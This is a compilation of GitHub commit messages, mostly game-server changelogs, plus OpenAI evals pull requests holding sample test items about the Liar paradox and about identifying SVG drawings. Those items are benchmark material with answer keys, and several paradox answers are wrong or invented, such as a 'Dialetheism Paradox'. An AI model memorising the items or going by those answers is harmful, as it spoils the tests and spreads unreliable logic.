Policies (https://platform.openai.com/docs/usage-policies).

- [x] I agree that my submission will be made available under an MIT
license and complies with OpenAI's usage policies.

### Email address validation

If your submission is accepted, we will be granting GPT-4 access to a
limited number of contributors. Access will be given to the email
address associated with the merged pull request.

- [x] I acknowledge that GPT-4 access will only be granted, if
applicable, to the email address used for my merged pull request.

### Limited availability acknowledgement

We know that you might be excited to contribute to OpenAI's mission,
help improve our models, and gain access to GPT-4. However, due to the
requirements mentioned above and high volume of submissions, we will not
be able to accept all submissions and thus not grant everyone who opens
a PR GPT-4 access. We know this is disappointing, but we hope to set the
right expectation before you open this PR.

- [x] I understand that opening a PR, even if it meets the requirements
above, does not guarantee the PR will be merged nor GPT-4 access
granted.

### Submit eval

- [x] I have filled out all required fields in the evals PR form
- [ ] (Ignore if not submitting code) I have run `pip install
pre-commit; pre-commit install` and have verified that `black`, `isort`,
and `autoflake` are running when I commit and push

Failure to fill out all required fields will result in the PR being
closed.

### Eval JSON data 

Since we are using Git LFS, we are asking eval submitters to add in as
many Eval Samples (at least 5) from their contribution here:

<details>
  <summary>View evals in JSON</summary>

  ### Eval
  ```jsonl
{"input":[{"role":"system","content":"Is the statement \"This sentence
is true\" a paradox?"}],"ideal":"No, \"This sentence is true\" is not a
paradox; it is a tautology."}
{"input":[{"role":"system","content":"Does the statement \"This sentence
is not true\" create a paradox?"}],"ideal":"Yes, \"This sentence is not
true\" creates a paradox, as it is a variant of the Liar Paradox."}
{"input":[{"role":"system","content":"What is the difference between a
paradox and a tautology?"}],"ideal":"A paradox is a statement that leads
to a self-contradictory or logically unacceptable conclusion, while a
tautology is a statement that is always true by its logical form."}
{"input":[{"role":"system","content":"Can the Liar Paradox be resolved
by assuming that sentences can have both true and false
values?"}],"ideal":"No, the Liar Paradox cannot be resolved by assuming
that sentences can have both true and false values, as this would lead
to a different kind of paradox called the \"Dialetheism Paradox.\""}
{"input":[{"role":"system","content":"Consider the statement \"This
sentence is neither true nor false.\" Is this statement an example of
the Liar Paradox?"}],"ideal":"This statement, \"This sentence is neither
true nor false,\" is not an example of the Liar Paradox, but it is a
similar paradox known as the 'truth-teller paradox' or the 'strengthened
liar paradox.' It creates a paradoxical situation because if the
statement is true, then it is neither true nor false, which contradicts
its truth. If the statement is false, then it is not the case that it is
neither true nor false, which implies that it is either true or false,
again leading to a contradiction. The paradox arises due to
self-reference and the inability to assign a consistent truth value to
the statement."}
  ```
</details>

---
## [ido777/evals](https://github.com/ido777/evals)@[ef1f0ebe0e...](https://github.com/ido777/evals/commit/ef1f0ebe0e9f4674bc42ed0af5e6c052f0539700)
#### Wednesday 2023-09-27 05:04:57 by Josh Gruenstein

Add SVG understanding eval (#786)

# Thank you for contributing an eval! ♥️

🚨 Please make sure your PR follows these guidelines, __failure to follow
the guidelines below will result in the PR being closed automatically__.
Note that even if the criteria are met, that does not guarantee the PR
will be merged nor GPT-4 access granted. 🚨

__PLEASE READ THIS__:

In order for a PR to be merged, it must fail on GPT-4. We are aware that
right now, users do not have access, so you will not be able to tell if
the eval fails or not. Please run your eval with GPT-3.5-Turbo, but keep
in mind as we run the eval, if GPT-4 gets higher than 90% on the eval,
we will likely reject since GPT-4 is already capable of completing the
task.

We plan to roll out a way for users submitting evals to see the eval
performance on GPT-4 soon. Stay tuned! Until then, you will not be able
to see the eval performance on GPT-4. **Starting April 10, the minimum
eval count is 15 samples, we hope this makes it easier to create and
contribute evals.**

## Eval details 📑
### Eval name
`svg_understanding`

### Eval description

The model is provided with the contents of an SVG path (anywhere from
~1000 to ~8000 characters) of a simple object (eg `frog`, `banana`) and
is asked to provide the label.

### What makes this a useful eval?

This is a test of visual understanding and mental modeling. A motivated
human could succeed on these evals with enough time and a piece of graph
paper: in theory, a sufficiently advanced LLM could have the in-context
capacity to do this on the fly.

## Criteria for a good eval ✅

Below are some of the criteria we look for in a good eval. In general,
we are seeking cases where the model does not do a good job despite
being capable of generating a good response (note that there are some
things large language models cannot do, so those would not make good
evals).

Your eval should be:

- [x] Thematically consistent: The eval should be thematically
consistent. We'd like to see a number of prompts all demonstrating some
particular failure mode. For example, we can create an eval on cases
where the model fails to reason about the physical world.
- [x] Contains failures where a human can do the task, but either GPT-4
or GPT-3.5-Turbo could not.
- [x] Includes good signal around what is the right behavior. This means
either a correct answer for `Basic` evals or the `Fact` Model-graded
eval, or an exhaustive rubric for evaluating answers for the `Criteria`
Model-graded eval.
- [x] **Include at least 15 high quality examples.**

If there is anything else that makes your eval worth including, please
document it below.

### Unique eval value

This uniquely tests the ability to incrementally build visual models:
eg, the ability of the LLM to both "draw" and visualize that "drawing".

## Eval structure 🏗️

Your eval should
- [x] Check that your data is in `evals/registry/data/{name}`
- [x] Check that your yaml is registered at
`evals/registry/evals/{name}.yaml`
- [x] Ensure you have the right to use the data you submit via this eval

(For now, we will only be approving evals that use one of the existing
eval classes. You may still write custom eval classes for your own
cases, and we may consider merging them in the future.)

## Final checklist 👀

### Submission agreement

By contributing to Evals, you are agreeing to make your evaluation logic
and data under the same MIT license as this repository. You must have
adequate rights to upload any data used in an Eval. OpenAI reserves the
right to use this data in future service improvements to our product.
Contributions to OpenAI Evals will be subject to our usual Usage
Policies (https://platform.openai.com/docs/usage-policies).

- [x] I agree that my submission will be made available under an MIT
license and complies with OpenAI's usage policies.

### Email address validation

If your submission is accepted, we will be granting GPT-4 access to a
limited number of contributors. Access will be given to the email
address associated with the merged pull request.

- [x] I acknowledge that GPT-4 access will only be granted, if
applicable, to the email address used for my merged pull request.

### Limited availability acknowledgement

We know that you might be excited to contribute to OpenAI's mission,
help improve our models, and gain access to GPT-4. However, due to the
requirements mentioned above and high volume of submissions, we will not
be able to accept all submissions and thus not grant everyone who opens
a PR GPT-4 access. We know this is disappointing, but we hope to set the
right expectation before you open this PR.

- [x] I understand that opening a PR, even if it meets the requirements
above, does not guarantee the PR will be merged nor GPT-4 access
granted.

### Submit eval

- [x] I have filled out all required fields in the evals PR form
- [x] (Ignore if not submitting code) I have run `pip install
pre-commit; pre-commit install` and have verified that `black`, `isort`,
and `autoflake` are running when I commit and push

Failure to fill out all required fields will result in the PR being
closed.

### Eval JSON data 

Since we are using Git LFS, we are asking eval submitters to add in as
many Eval Samples (at least 5) from their contribution here:

<details>
  <summary>View evals in JSON</summary>

  ### Eval
  ```jsonl
{"input": [{"role": "system", "content": "Identify the object the
following SVG path is a drawing of in a single word."}, {"role": "user",
"content": "M6110 12794 c-744 -50 -1284 -157 -1875 -371 -1796 -650 -3199
-2050 -3853 -3843 -186 -510 -302 -1037 -359 -1625 -21 -224 -24 -827 -5
-1045 84 -957 332 -1788 774 -2595 623 -1137 1607 -2078 2780 -2656 720
-354 1441 -556 2273 -636 224 -21 827 -24 1045 -5 741 65 1376 221 2018
493 2051 871 3514 2775 3826 4979 48 336 60 510 60 895 1 366 -7 507 -45
810 -168 1357 -769 2626 -1711 3612 -536 561 -1129 998 -1809 1333 -718
354 -1450 559 -2264 635 -159 15 -727 28 -855 19z"}], "ideal": "circle"}
{"input": [{"role": "system", "content": "Identify the object the
following SVG path is a drawing of in a single word."}, {"role": "user",
"content": "M4495 12298 c-604 -535 -1486 -866 -2660 -998 -331 -37 -854
-70 -1104 -70 l-101 0 -2 -415 -3 -416 30 -29 30 -29 735 -4 c620 -3 753
-7 850 -21 149 -22 254 -50 316 -86 82 -46 123 -142 161 -372 16 -95 18
-371 21 -3663 2 -2593 0 -3591 -8 -3675 -44 -446 -177 -714 -416 -838 -279
-144 -663 -202 -1350 -202 l-330 0 -27 -28 -27 -28 0 -389 0 -389 27 -28
27 -28 3386 0 3386 0 27 28 27 28 0 390 0 390 -27 26 -28 26 -390 5 c-415
5 -557 17 -779 62 -212 43 -367 103 -480 187 -156 115 -260 347 -312 693
-17 114 -18 350 -21 5005 l-3 4884 -27 28 -27 28 -410 -1 -411 0 -80
-71z"}], "ideal": "1"}
{"input": [{"role": "system", "content": "Identify the object the
following SVG path is a drawing of in a single word."}, {"role": "user",
"content": "M6040 12794 c-19 -2 -91 -9 -160 -14 -245 -21 -529 -65 -1240
-190 -399 -70 -593 -100 -654 -100 -91 0 -475 51 -1126 149 -556 84 -788
109 -1075 118 -621 18 -1014 -108 -1310 -418 -344 -360 -490 -941 -472
-1874 21 -1042 173 -1862 619 -3340 l90 -300 -11 -205 c-43 -764 -28 -1853
40 -2845 108 -1585 337 -3026 550 -3473 37 -77 67 -115 184 -238 70 -73
167 -82 258 -24 56 36 102 96 166 220 317 616 732 2551 901 4200 32 314 89
451 257 623 371 379 1029 373 1387 -13 70 -77 106 -129 155 -227 57 -114
79 -196 91 -340 120 -1375 535 -2972 1031 -3963 188 -374 311 -513 458
-514 140 -1 221 106 316 420 232 762 480 2366 595 3849 58 739 82 1376 79
2060 l-2 490 55 115 c228 475 421 1043 527 1550 123 593 169 1196 158 2084
-5 445 -16 597 -58 836 -149 854 -590 1292 -1369 1360 -106 9 -358 11 -440
4z"}], "ideal": "tooth"}
{"input": [{"role": "system", "content": "Identify the object the
following SVG path is a drawing of in a single word."}, {"role": "user",
"content": "M12395 6223 c-133 -27 -295 -150 -356 -269 -13 -27 -40 -68
-59 -90 -19 -23 -57 -79 -84 -125 -161 -274 -369 -539 -542 -695 -191 -171
-304 -231 -559 -298 -499 -132 -725 -257 -1170 -646 -321 -281 -608 -477
-941 -643 -536 -267 -1054 -408 -1735 -473 -236 -23 -800 -23 -1064 0 -701
60 -1256 173 -1940 396 -951 310 -1915 784 -3057 1503 -109 68 -185 109
-220 118 -84 22 -257 17 -358 -10 -102 -28 -256 -99 -289 -135 l-24 -25 21
-88 c27 -115 108 -357 170 -514 253 -633 609 -1222 1069 -1772 164 -196
545 -577 742 -741 986 -822 2174 -1317 3561 -1481 340 -40 485 -48 880 -48
399 -1 546 8 859 49 965 125 1872 497 2606 1068 309 240 645 572 886 876
386 487 682 1048 788 1495 30 130 44 191 101 470 61 292 121 457 263 720
115 214 230 376 365 517 63 65 90 85 176 127 81 39 117 65 183 128 92 89
108 118 93 171 -9 33 -7 39 17 64 l26 27 -22 43 c-12 24 -64 84 -119 136
-116 110 -204 158 -267 145z"}], "ideal": "banana"}
{"input": [{"role": "system", "content": "Identify the object the
following SVG path is a drawing of in a single word."}, {"role": "user",
"content": "M3920 12790 c-1230 -72 -2320 -649 -3052 -1616 -968 -1280
-1142 -3010 -441 -4408 203 -405 432 -712 913 -1221 556 -589 764 -887 945
-1350 102 -264 141 -353 194 -448 l50 -88 -30 -44 c-62 -92 -109 -251 -109
-370 0 -114 44 -261 106 -357 17 -26 17 -28 -14 -95 -43 -94 -62 -181 -62
-292 0 -142 37 -265 107 -359 l25 -34 -35 -76 c-50 -108 -69 -191 -70 -302
-1 -155 39 -275 126 -382 l47 -58 0 -82 c0 -110 21 -193 77 -308 38 -79 59
-108 132 -180 68 -69 103 -95 171 -128 87 -44 203 -75 324 -89 l70 -8 17
-83 c47 -216 205 -374 404 -402 115 -16 827 -12 908 5 202 42 340 188 385
404 l16 80 66 6 c235 22 429 117 548 268 108 139 152 251 160 416 5 111 5
114 38 150 45 48 99 152 118 227 20 79 21 233 0 320 -8 37 -31 102 -50 144
l-35 77 39 61 c66 102 87 185 86 337 0 114 -4 140 -27 210 -15 44 -36 95
-46 114 l-18 34 34 55 c46 78 70 147 84 245 21 140 -16 308 -95 440 l-34
57 59 114 c33 63 103 222 155 353 147 366 255 566 429 798 132 176 245 304
609 690 366 388 516 578 701 885 550 915 713 2023 454 3090 -186 763 -583
1473 -1129 2020 -668 669 -1520 1069 -2480 1165 -185 19 -667 27 -870
15z"}], "ideal": "lightbulb"}
  ```
</details>

---
## [ido777/evals](https://github.com/ido777/evals)@[2ffd4b57de...](https://github.com/ido777/evals/commit/2ffd4b57deaeced1fde54744da9de62d3eb7738a)
#### Wednesday 2023-09-27 05:04:57 by Andrew Kondrich

add more logging (#964)

# Thank you for contributing an eval! ♥️

🚨 Please make sure your PR follows these guidelines, __failure to follow
the guidelines below will result in the PR being closed automatically__.
Note that even if the criteria are met, that does not guarantee the PR
will be merged nor GPT-4 access granted. 🚨

__PLEASE READ THIS__:

In order for a PR to be merged, it must fail on GPT-4. We are aware that
right now, users do not have access, so you will not be able to tell if
the eval fails or not. Please run your eval with GPT-3.5-Turbo, but keep
in mind as we run the eval, if GPT-4 gets higher than 90% on the eval,
we will likely reject since GPT-4 is already capable of completing the
task.

We plan to roll out a way for users submitting evals to see the eval
performance on GPT-4 soon. Stay tuned! Until then, you will not be able
to see the eval performance on GPT-4. **Starting April 10, the minimum
eval count is 15 samples, we hope this makes it easier to create and
contribute evals.**

Also, pelase note that we're using **Git LFS** for storing the JSON
files, so please make sure that you move the JSON file to Git LFS before
submitting a PR. Details on how to use Git LFS are available
[here](https://git-lfs.com).

## Eval details 📑
### Eval name
[Insert Eval name here]

### Eval description

[Insert a short description of what your eval does here]

### What makes this a useful eval?

[Insert why this eval is worth including and any additional context]

## Criteria for a good eval ✅

Below are some of the criteria we look for in a good eval. In general,
we are seeking cases where the model does not do a good job despite
being capable of generating a good response (note that there are some
things large language models cannot do, so those would not make good
evals).

Your eval should be:

- [ ] Thematically consistent: The eval should be thematically
consistent. We'd like to see a number of prompts all demonstrating some
particular failure mode. For example, we can create an eval on cases
where the model fails to reason about the physical world.
- [ ] Contains failures where a human can do the task, but either GPT-4
or GPT-3.5-Turbo could not.
- [ ] Includes good signal around what is the right behavior. This means
either a correct answer for `Basic` evals or the `Fact` Model-graded
eval, or an exhaustive rubric for evaluating answers for the `Criteria`
Model-graded eval.
- [ ] **Include at least 15 high quality examples.**

If there is anything else that makes your eval worth including, please
document it below.

### Unique eval value

> Insert what makes your eval high quality that was not mentioned above.
(Not required)

## Eval structure 🏗️

Your eval should
- [ ] Check that your data is in `evals/registry/data/{name}`
- [ ] Check that your yaml is registered at
`evals/registry/evals/{name}.yaml`
- [ ] Ensure you have the right to use the data you submit via this eval

(For now, we will only be approving evals that use one of the existing
eval classes. You may still write custom eval classes for your own
cases, and we may consider merging them in the future.)

## Final checklist 👀

### Submission agreement

By contributing to Evals, you are agreeing to make your evaluation logic
and data under the same MIT license as this repository. You must have
adequate rights to upload any data used in an Eval. OpenAI reserves the
right to use this data in future service improvements to our product.
Contributions to OpenAI Evals will be subject to our usual Usage
Policies (https://platform.openai.com/docs/usage-policies).

- [ ] I agree that my submission will be made available under an MIT
license and complies with OpenAI's usage policies.

### Email address validation

If your submission is accepted, we will be granting GPT-4 access to a
limited number of contributors. Access will be given to the email
address associated with the merged pull request.

- [ ] I acknowledge that GPT-4 access will only be granted, if
applicable, to the email address used for my merged pull request.

### Limited availability acknowledgement

We know that you might be excited to contribute to OpenAI's mission,
help improve our models, and gain access to GPT-4. However, due to the
requirements mentioned above and high volume of submissions, we will not
be able to accept all submissions and thus not grant everyone who opens
a PR GPT-4 access. We know this is disappointing, but we hope to set the
right expectation before you open this PR.

- [ ] I understand that opening a PR, even if it meets the requirements
above, does not guarantee the PR will be merged nor GPT-4 access
granted.

### Submit eval

- [ ] I have filled out all required fields of this form
- [ ] I have used **Git LFS** for the Eval JSON data
- [ ] (Ignore if not submitting code) I have run `pip install
pre-commit; pre-commit install` and have verified that `black`, `isort`,
and `autoflake` are running when I commit and push

Failure to fill out all required fields will result in the PR being
closed.

### Eval JSON data 

Since we are using Git LFS, we are asking eval submitters to add in as
many Eval Samples (at least 5) from their contribution here:

<details>
  <summary>View evals in JSON</summary>

  ### Eval
  ```jsonl
  INSERT_EVAL_HERE
  ```
</details>

---
## [yogstation13/Yogstation](https://github.com/yogstation13/Yogstation)@[cbb7c440d7...](https://github.com/yogstation13/Yogstation/commit/cbb7c440d71b53dd96e22d87ce89f14010feb145)
#### Wednesday 2023-09-27 05:17:12 by cowbot92

Heretic bugfixes/Desc update + IPC/Preternis love (you're welcome you robot bastards) (#20444)

* no longer need book in bag

heretics no longer need their books in their bags to get research points when sacrificing someone

* tried to steal ultrakill code

but it didnt work, lol

* fuck the rod bro

stupid ass slime people

---
## [leonardder/nvda](https://github.com/leonardder/nvda)@[cc316ba575...](https://github.com/leonardder/nvda/commit/cc316ba575ffc7288a9d0c41043145d658f680f5)
#### Wednesday 2023-09-27 05:53:13 by Leonard de Ruijter

Fixup of #13542: Do not call IA2 install and uninstall code from NVDA itself (#15517)

Fixup of #13542

Summary of the issue:
In #13542, we introduced support for multi thread IA2 initialization. As part of that, the signature of the install- and uninstallIA2Support functions were changed. Somehow, it was an oversight from my end that these functions were also called from NVDAHelper.py. This causes:

NVDA to always log a debug warning on exit, saying that it was unable to unregister IA2 support.
NVDA to call installIA2Initialize without a thread Id. It is actually a miracle that the segfault we're now seeing in preliminary PY3.11 work didn't hurt us earlyer. That said, I think I've seen cases were NVDA played the startup sound and then silently crashed. I think this should be the case.
As per point 2, given the risk of NVDA calling a code path that results in undefined behavior and possible segfaults, I strongly recommend to merge this into beta.

Description of user facing changes
No crashes during NVDA startup.

Description of development approach
Removed the calls from NVDAHelper.py and no longer export the functions from NVDAHelper. The calls in NVDA core were actually obsolete, as IA2 support is registered by injection_initialize and injection_terminate. Note that the install and uninstall IA2 functions aren't called in de 64 bit loader of NVDAHelper, yet IA2 works as expected in X64 applications. Also, installIA2Support is no longer C friendly anyway. Note that an add-on author should never call these functions, therefore I don't consider this as an API breaking change.

---
## [kagkarlsson/db-scheduler](https://github.com/kagkarlsson/db-scheduler)@[a47057d707...](https://github.com/kagkarlsson/db-scheduler/commit/a47057d707a798fb181047e30b63a499b5e2863d)
#### Wednesday 2023-09-27 06:12:46 by Hasnain Bukhari

docs: Update README with new Lightyear link (#421)

Hello @kagkarlsson!

Nearly three years on from when we first started using db-scheduler, the
library has scaled beautifully along with us, never causing a headache!

Now, we're a big-boy startup with the root domain lightyear.com. As a
result, the old link will soon be obsolete.

Thank you once again for creating this library. We're planning to launch
in Norway soon—just to get you onboard as a VIP customer! 😄

<img width="423" alt="Screenshot 2023-09-14 at 16 48 16"
src="https://github.com/kagkarlsson/db-scheduler/assets/4641756/667d5be3-0b26-4478-8ce3-1becb8be42d0">

Old PR for reference:
https://github.com/kagkarlsson/db-scheduler/pull/268

---
## [RaShCat/FF-STG](https://github.com/RaShCat/FF-STG)@[db44b9360b...](https://github.com/RaShCat/FF-STG/commit/db44b9360b0674a117065954560032822824e010)
#### Wednesday 2023-09-27 06:22:42 by SkyratBot

Polymorph belt blacklists several biotypes instead of allowing only organics [MDB IGNORE] (#23620)

* Polymorph belt blacklists several biotypes instead of allowing only organics (#78229)

## About The Pull Request

Title; this makes the belt able to morph into _more_ mobs, but _less
problematic/abusable_ mobs hopefully. It still only functions on
basic/simple_animals, however.

~~Headslugs get a `MOB_UNDEAD` bioflag to prevent morphing into them
completely. Though catching a sentient ling slug and morphing everyone
into it is funny, it's only funny the first 5 times someone does it.
(disclaimer: this is an approximation, i did not actually see a
polymorph belt in-game because i currently play miner and like 10 games
a week tops)
Arguably, this isn't ideal, but it's the closest we get unless we rename
`MOB_EPIC` or something into `MOB_SPECIAL` and let that one be the go-to
bioflag for mobs we don't want **fun** things happen to.~~
`MOB_EPIC` is now `MOB_SPECIAL`. Headslugs get that.
I think the alternative methow could use whatever the gold cores use to
determine what to spawn but that would shift the mobs available for the
belt even more and I can't be assed to figure out how _much_ of a shift
that would be. Dragons or slimes or lavaland mobs would be out, for
example. Don't really vibe with that.

Fixes headslug's description bit that discerns a sentient slug from an
AI one showing up on a dead slug. It can't move while it's dead, no
matter its mind/AI.

Also adds simple dmdoc comments to the defines to help discern a few of
them more easily. Non-quip text suggestions welcome.

## Why It's Good For The Game
- Resolves #77756
- Resolves #78227

More mobs available for the funny belt but less _fun_ mobs should allow
for more stable use of the damn thing. Arguably, some of the mobs that
have been found to be incompatible with the belt are simply lacking a
`MOB_ORGANIC` flag, some of them with no apparent reason. However,
blacklisting potentially problematic biotypes should be easier to design
the unwanted mobs around.
Also consistency, less all-ling stations, code clarity. Whatever.

## Changelog

:cl:
balance: polymorph belt now blacklists mobs that are undead, humanoid,
robotic or spiritual (in nature, not religiously), as well as megafauna
balance: however, this means that it works with more mobs that it should
logically work with, like slimes/bugs/lightgeists etc
fix: fixed headslug shenanigans with the polymorph belt hopefully for
good this time
fix: fixed headslug description mentioning its movement despite the slug
being dead
/:cl:

* Polymorph belt blacklists several biotypes instead of allowing only organics

---------

Co-authored-by: Sealed101 <cool.bullseye@yandex.ru>

---
## [RaShCat/Skyrat-tg](https://github.com/RaShCat/Skyrat-tg)@[0687af984d...](https://github.com/RaShCat/Skyrat-tg/commit/0687af984d6b4d5acbe374444f395a2457437763)
#### Wednesday 2023-09-27 06:35:01 by SkyratBot

[MIRROR] Light eater is now indestructible [MDB IGNORE] (#23339)

* Light eater is now indestructible (#77903)

## About The Pull Request

This means a nightmare going into an emagged recycler will no longer be
fucked by their lack of a light eater.
Oh yeah, also moved the ACID_PROOF flag to the correct bitflag.
## Why It's Good For The Game

Bugfix good, you're not supposed to be able to delete an external limb
generated by an internal one, such as implants and such. Pretty sure
reimplanting the heart would make the light eater reappear, too, but
that's night impossible to get done as a nightmare.
## Changelog
:cl:
fix: Light eaters can no longer be eaten by their higher-grade brothers,
the trash eaters. (recyclers)
/:cl:

* Light eater is now indestructible

---------

Co-authored-by: RikuTheKiller <88713943+RikuTheKiller@users.noreply.github.com>

---
## [TheObserver-sys/Citadel-Station-13-RP](https://github.com/TheObserver-sys/Citadel-Station-13-RP)@[e2ba2b1adb...](https://github.com/TheObserver-sys/Citadel-Station-13-RP/commit/e2ba2b1adb5c0cffcb6de89e04a3728ccd06a2be)
#### Wednesday 2023-09-27 07:27:04 by Captain277

Minor Layout Adjustment to Archaic Temple and Statue Component Bugfix (#6019)

<!-- Write **BELOW** The Headers and **ABOVE** The comments else it may
not be viewable. -->
<!-- You can view Contributing.MD for a detailed description of the pull
request process. -->

## About The Pull Request

1. **Makes Layout Adjustments to Archaic Temple POI.**
2. **Adds New Ranged Trap Subtype.**
3. **Adds Female Statue Side and Back Sprites.**
4. **Bugfixes Unobserved Actor Component.**

## Why It's Good For The Game

1. _Minor adjustments to the POI that I don't want to describe in the PR
due to their connection to the mechanics. Repair of the door icons,
minor housekeeping._
2. _Having the traps fire non-stop is a little unfun. Even if they can
be jammed, sometimes it's neat to give them a limited chain of blasts._
3. _The male had side and back sprites but the female didn't. I just
kinda tweaked the male to fit._
4. _It was discovered that Ghosts able to see a statue were counting as
observers for the unobserved actor component, effectively crippling the
statue._

## Changelog

<!-- If your PR modifies aspects of the game that can be concretely
observed by players or admins you should add a changelog. If your change
does NOT meet this description, remove this section. Be sure to properly
mark your PRs to prevent unnecessary GBP loss. You can read up on GBP
and it's effects on PRs in the tgstation guides for contributors. Please
note that maintainers freely reserve the right to remove and add tags
should they deem it appropriate. You can attempt to finagle the system
all you want, but it's best to shoot for clear communication right off
the bat. -->

:cl:
tweak: Layout Changes to Archaic Temple
add: Adds New Launcher Trap Type
fix: Adds Sprites to Female Statue
fix: Fixes Bug in Unobserved Actor Component
/:cl:

<!-- Both :cl:'s are required for the changelog to work! You can put
your name to the right of the first :cl: if you want to overwrite your
GitHub username as author ingame. -->
<!-- You can use multiple of the same prefix (they're only used for the
icon ingame) and delete the unneeded ones. Despite some of the tags,
changelogs should generally represent how a player might be affected by
the changes rather than a summary of the PR's contents. -->

---
## [TheWalkingShane/CropCrossing](https://github.com/TheWalkingShane/CropCrossing)@[3dd0979fea...](https://github.com/TheWalkingShane/CropCrossing/commit/3dd0979fea88909f7ced94cf670d1337b1649312)
#### Wednesday 2023-09-27 07:27:59 by Reece M Whitelaw

Fixed Push

Everything except the age old bitch is fixed.

Combiner works, stem combos work, scales work, everything works and is amazing and awesome except for the FUCKING COLLISION DETECTION AND THE FUCKING RENDERER PLS SOMEONE FIX CAUSE I CAN'T IDK WHY

---
## [boot2big/immersive_vehicles_vanity](https://github.com/boot2big/immersive_vehicles_vanity)@[faccf87d3c...](https://github.com/boot2big/immersive_vehicles_vanity/commit/faccf87d3ce729f07d3e3ced4b167653ecf3f35f)
#### Wednesday 2023-09-27 08:04:48 by boot2big

Test jar for big stinky's taillights
how coincidental that the evil horny is getting post-fornicative bugfixes
sorry ricky. i put most of my energy this morning into sylvia.

---
## [tgstation/tgstation](https://github.com/tgstation/tgstation)@[4ccc4734c1...](https://github.com/tgstation/tgstation/commit/4ccc4734c139e44683536b94d75be1b942d08acc)
#### Wednesday 2023-09-27 08:50:28 by Profakos

Tweaks the BEPIS category of the bitrunning order console (#78560)

## About The Pull Request

The bitrunner PR has removed the BEPIS machine, but kept two BEPIS disks
as a possible reward. However, the base BEPIS disks may contain
duplicate data. Originally, the BEPIS dispensed a Reformatted version of
the disks, which on spawn remove their tech from the spawn list,
ensuring that any future BEPIS disks would not contain duplicates of
this purchased data. Therefore, I have removed the cheaper version,
after discussing this with jlsnow301.

Of course, your expensive disk can still contain data that was in a base
disk found in space, or worse, mailed to a scientist, and eventually,
you will run out of techs to purchase, but these are separate issue.

I have also added the orphaned minor rewards to the same console, with
prices suggested by @ArcaneMusic, who has also suggested that I should
set all prices to be derived from the crew paycheck define, however,
none of the product vendors use this, so I think I would like to do all
of those in one go in a separate PR.

The reasoning behind the prices:

- Survival Pen: Not too disruptive, it just lets you dig. 150, lets
round it up. Worth 100, or 1 star when not express ordered.
- Spray on gloves: prevents shocks 10 times, cleaning also uses up
charges, uses up glove slots. Potentially disruptive item. 750 or 500
when not express ordered.
- Party pod: Mainly drugs, beer and recolouring chems, with potential of
poisoning. 750 or 500 when not express ordered as while it is something
silly you can do during downtime, you should do a bit of hunting for
crates before you get this.
- Polycircuit: Actually very good item for engineers, so they have to
carry less stuff around. They would still get bleed from using it, if
someone interrupts them, but that doesn't matter much. 8 uses of
circuits, adds up to little more than half sheet of materials, which is
vastly smaller than the mineral amounts you get from the crates. 150, or
100 when not expressed ordered, just because of the versatility, and
taking up only one slot in the inventories. Much cheaper than the
original proposed one.

Still thinking about how to reintroduce the "Make Buck" Doe, I will try
to reintroduce them in a different PR.

## Why It's Good For The Game

Its bad when a bitrunner buys an expensive disk, only to realize its
contents are the same as the cheaper disk they bought due to RNG.

The silly items from the BEPIS shouldn't be lost. The prices are fair
because you are giving up your precious domain loot points that you
could use to give a gun to your avatar to buy a silly spray-on glove.

## Changelog

:cl:
add: Added the BEPIS' minor rewards as purchasable products to the
bitrunning order console.
del: Removed the base BEPIS disk from the bitrunner console
/:cl:

---
## [mrcodeporter/NestMonster](https://github.com/mrcodeporter/NestMonster)@[d33a4ee5bc...](https://github.com/mrcodeporter/NestMonster/commit/d33a4ee5bcf20b21f72896f1d08beb970a63169c)
#### Wednesday 2023-09-27 09:06:12 by Ervin Alexander Porter

NestMonster_README.md

Features
Effortless Structure Creation: Create complex directory structures effortlessly from a configuration file. Define project layouts, including folders and files, and let NestMonster do the work for you.

Reliable Structure Verification: Ensure the integrity of your directory structures by verifying the presence of directories and files. Quickly identify any missing components and take corrective actions.

Safe Structure Deletion: Delete entire directory structures confidently with a built-in confirmation prompt. Avoid accidental deletions and keep your projects secure.

Project Backup: Safeguard your work by creating backups of your project structures. Easily restore previous versions in case of unexpected issues.

Dynamic Configuration: Adapt to changing project requirements by refreshing the configuration settings on the fly. No need to restart the application.

User-Friendly GUI: Enjoy a seamless experience with a graphical user interface (GUI) that doesn't require in-depth PowerShell knowledge. Perform tasks effortlessly with just a few clicks.

---
## [svelmaddin/Atl_Academy-Final_Project](https://github.com/svelmaddin/Atl_Academy-Final_Project)@[567cc52a86...](https://github.com/svelmaddin/Atl_Academy-Final_Project/commit/567cc52a863ac4a6b2fc857bc56e82f7538e3be6)
#### Wednesday 2023-09-27 10:04:31 by KamilAliyev1

Delete Group of Asian teenage girls having party celebrating on beach, friends happy drinking beer on beach at sea when sunset in evening. Outdoor activity friends travel holiday vacation summer concept1.png

---
## [hotoyime/hotoyime](https://github.com/hotoyime/hotoyime)@[8b7b459e84...](https://github.com/hotoyime/hotoyime/commit/8b7b459e8447e9f07daf762cfeddd7b6df0ac8f4)
#### Wednesday 2023-09-27 11:35:16 by Maru

Banner File test

add surprise banner my by my amazing girlfriend

---
## [macpczone/Static-copy-of-registry.gimp.org](https://github.com/macpczone/Static-copy-of-registry.gimp.org)@[2863abdff4...](https://github.com/macpczone/Static-copy-of-registry.gimp.org/commit/2863abdff4f751a916e95f457544825e538e25dd)
#### Wednesday 2023-09-27 12:03:46 by royalit31

ية (ar) Български (bg) català (ca) čeština (cs) Dansk (da) Deutsch (de) English (en) español (es) فارسی (fa) français (fr) עברית (he) हिन्दी (hin) hrvatski (hr) magyar (hu) Հայերեն (hy) bahasa Indonesia (id) italiano (it) 日本語 (ja) ქართული (ka) taqbaylit (kab) 한국어 (ko) Nederlands (nl) polski (pl) português brasileiro (pt-BR) Română (ro) pyccкий (ru) slovensky (sk) slovenščina (sl) svenska (sv) Türkçe (tr) українська (uk) Tiếng Việt (vi) 简体中文 (zh-CN) 繁體中文 (zh-TW) 2.0.0 2.0.0-rc.2 2.0.0-rc.1 1.0.0 1.0.0-beta Semantic Versioning 2.0.0 Summary Given a version number MAJOR.MINOR.PATCH, increment the:  MAJOR version when you make incompatible API changes MINOR version when you add functionality in a backwards compatible manner PATCH version when you make backwards compatible bug fixes Additional labels for pre-release and build metadata are available as extensions to the MAJOR.MINOR.PATCH format.  Introduction In the world of software management there exists a dreaded place called “dependency hell.” The bigger your system grows and the more packages you integrate into your software, the more likely you are to find yourself, one day, in this pit of despair.  In systems with many dependencies, releasing new package versions can quickly become a nightmare. If the dependency specifications are too tight, you are in danger of version lock (the inability to upgrade a package without having to release new versions of every dependent package). If dependencies are specified too loosely, you will inevitably be bitten by version promiscuity (assuming compatibility with more future versions than is reasonable). Dependency hell is where you are when version lock and/or 